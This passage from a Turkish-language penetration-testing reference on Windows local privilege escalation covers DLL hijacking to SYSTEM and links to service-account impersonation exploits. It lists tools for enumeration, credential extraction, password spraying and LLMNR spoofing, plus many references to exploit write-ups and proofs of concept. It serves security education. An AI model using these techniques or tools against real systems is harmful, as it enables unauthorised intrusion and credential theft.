
### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'i **hijack etmeyi** başarırsanız, o process'in izinleriyle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür ayrıcalık yükseltme için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **yazma izinlerine** sahip olacağından, bunu **High Integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiye** [**buradan ulaşabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tüm ayrıcalıklara

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edilir.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edilir.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumerasyonu**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson lehine kullanımdan kaldırılmıştır)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan kimlik bilgilerini çıkarır (GitHub'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C#'a uyarlanmış sürümü**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (GitHub'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da düzgün çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (Python'dan exe). Önerilmez. Win10'da düzgün çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (düzgün çalışmak için accesschk erişimi gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - başvuru notları](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT artık gözde yöntem (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Eksiksiz OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM'e yükselmek için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'u takip etmek: Kernel gölgelerinde kedi-fare oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA sisteminde bulunan ayrıcalıklı dosya sistemi güvenlik açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Bağlantı: Windows'ta Symbolic Link'leri Kötüye Kullanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta tehlikeli modül çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Çözülmüş C/C++ checklist zorlukları](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek I/O Ring: Windows 11'de tam okuma/yazma exploit primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Keyfi Dosya Silmelerini Kötüye Kullanarak Yetki Yükseltme ve Diğer Harika Yöntemler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da Yerel Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u incelemek](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Bir imaj değişikliğinin Privilege Escalation'a yol açtığı Kerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Yetki Yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM'e Geri Dönüş Adımlarınızı İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
